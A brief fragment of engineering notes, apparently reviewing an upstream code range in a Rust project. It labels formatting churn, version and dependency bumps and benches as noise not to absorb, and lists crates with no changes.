- Noise: repo-wide json!/rustfmt reformatting (~30+ files, e.g. sampler error.rs nets to ZERO), CHANGELOG/version/dep bumps, benches — absorbing would poison every future diff against the pin.
- Zero-change areas this range: xai-grok-markdown(-core), xai-grok-mcp, auth/secrets crates — nothing to consider.

